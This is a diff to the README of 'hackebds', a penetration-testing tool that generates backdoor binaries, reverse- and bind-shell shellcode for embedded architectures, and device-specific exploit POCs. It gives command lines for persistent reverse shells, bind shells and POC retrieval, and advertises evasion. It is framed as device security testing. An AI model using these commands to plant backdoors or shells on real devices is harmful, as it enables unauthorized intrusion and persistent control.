@@ -18,10 +18,15 @@
 
 This tool is embedded in the security test of the device. There are two main functions:
 
-1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be generated on the target machine)
-2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64，sparc  are now supported, and they are still being updated**
-3.  Generate bind of various architectures bind_Shell file.
-4.  Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
+1. Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be generated on the target machine)
+
+2. Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64，sparc  are now supported, and they are still being updated**
+
+3. Generate bind of various architectures bind_Shell file.
+
+4. Sort out the exploitable vulnerability POC or EXP of the embedded device, and search and output the basic information and POC of the device model in use: Function of equipment, Architecture of equipment,Device CPU manufacturer,Device CPU model,WEB service program of the device, and so on
+   
+5. Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
 
 
 ## install
@@ -56,6 +61,12 @@ Ubuntu（debian）:
  	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
 ```
 
+If the following error occurs
+
+hackebds: error: argument -model: expected one argument
+
+Please set all parameters to lowercase or lowercase mixed with uppercase. I guess it is due to the conflict between python and bash in the interpretation of uppercase and lowercase letters
+
 1. Use the command line to generate the backdoor file name, shellcode, bindshell, etc
 
    ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
@@ -69,54 +80,99 @@ Ubuntu（debian）:
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
    ```
    By default, the reverse shell backdoor is created using sh. If bash is required (PS: here, the bash command needs to exist on the target device)
-   
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
    ```
-   
+
    If you need to generate a backdoor and constantly create reverse shells (the CPU occupied by the test is about% 8)
-   
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
    ```
+
    
-   
-   
+
    ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
-   
+
    ```
    hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
    ```
    Create bind_shell to monitor the shell as sh, -power fuction can give -shell bash	
-   
+
    ```
    hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
    ```
-   
+
    The bind_shell process will not stop after being disconnected, and supports repeated connections (currently this function is not supported by powerpc and sparc series)
-   
+
    ![image-20221102182939434](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png)
+
    
-   
-   
+
    Generate cmd_file function is updated. Only need to specify the - cmd parameter to generate programs for various architectures to execute corresponding commands , -envp Environment variables are separated by commas
-   
+
    ```
    hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
    ```
-   
-   ![image-20230106153510332](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153510332.png)
-   
-   The list relationship between the output model and the architecture is added to the function of generating the backdoor for the specified model, which is convenient for observation and modification
-   
+
+   ![image-20230106153459125](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png)
+
+   The list relationship between the output model and the architecture is added to the function of generating the back door of the specified model to facilitate the user to observe and modify. The output information will be enhanced after version 0.3.5, such as (60 device information, POC40+or so):
+   Function of equipment
+   Architecture of equipment
+   Device CPU manufacturer
+   Device CPU model
+   WEB service program of the device
+   Device default SSH service support
+   Can monitoring be realized
+   Device default telnet user password
+   Device sdk support
+   Openwrt support for devices
+   Whether the device is vulnerable
+   POC output
+
    ```
    hackebds -l
    ```
-   
-   ![image-20230116204717279](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230116204717279.png)
-   
-   ![image-20230106153942787](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153942787.png)
-   
+
+   ![image-20230213105027599](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20230213105027599.png)
+
+   Add the retrieval of device information. Use - s to search for the - model parameter. This search is fuzzy and insensitive to case. Try to use the device information with the highest matching degree between lowercase output and input when inputting
+
+   ```
+   hackebds -model ex200 -s
+   ```
+
+   If the following warning occurs during command output
+
+   /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11: UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning
+     warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning')
+
+   If the following warning occurs during command output, you can use the following command to install python-levenshtein. After installation, the command retrieval speed can be increased by about 4 times
+
+   ```
+   pip install python-levenshtein
+   ```
+
+   ![image-20230213105520663](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20230213105520663.png)
+
+   The POC corresponding to the generated device can use - p or -- poc, which may be python scripts, commands, etc., and may need to be modified by yourself
+
+   ```
+   hackebds -model ex200 -p
+   ```
+
+   ![image-20230213105925356](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20230213105925356.png)
+
+   If a vulnerability is found in the test and you want to add the basic information of a new device to this tool, you can use the - add function for POC files or/tmp/model_ tree_ The format of the directory directory of the new device under the info/directory can refer to the standard generated format. After the insertion, you can use the tool search and POC generation functions
+
+   ```
+   hackebds -add
+   ```
+
+   ![image-20230213111024854](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/uPic/image-20230213111024854.png)
+
 2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
 ```
@@ -231,7 +287,7 @@ Tests can leverage chips and architectures
 
 Mips:
 MIPS 74kc V4.12 big endian,
-MIPS 24kc V5.0  little endian (Ralink SoC)
+MIPS 24kc V5.0  little endian (Ralink SoC) like MediaTek MT7621
 Ingenic Xburst V0.0  FPU V0.0  little endian
 
 Armv7:
@@ -244,7 +300,7 @@ BCM2711
 Powerpc, sparc: qemu
 
 
-## :beer:enjoy hacking(happy Chinese new Year!)
+## :beer:enjoy hacking
 
 
 ## updating
